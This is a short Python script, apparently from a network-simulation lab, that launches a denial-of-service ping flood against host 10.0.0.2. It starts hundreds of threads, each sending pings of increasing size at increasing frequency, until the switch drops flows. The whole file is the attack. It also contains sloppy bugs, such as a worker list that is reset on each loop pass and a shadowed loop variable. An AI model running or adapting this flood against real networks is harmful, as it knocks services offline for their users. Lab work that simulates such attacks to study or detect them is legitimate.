import subprocess
import os
import ipaddress
import time
from time import sleep
from threading import Thread
from unicodedata import name
import os 

"""
    Perform a Dos Attack from hm to h2.
    To simulate a Dos Attack hm would have to send flows with increasing size and/or frequency, 
    until a certain value is reached wich involves the drop of some of the flows passing by for s4.
"""
IP_H2 = "10.0.0.2"

def ping_host(i):
    # Increase size for each ping
    for i in range(100, 65000, 100):
        subprocess.run(["ping", "-s", str(i), "-i", str(100/i),IP_H2])


if __name__ == "__main__":
    for i in range(1,1000):
        worker = Thread(target=ping_host, args=(i,))
        workers = []
        workers.append(worker)
        worker.setDaemon(True)
        worker.start()
        # Increase frequency for each ping
        sleep(1/i)
    
    for w in workers:
        w.join()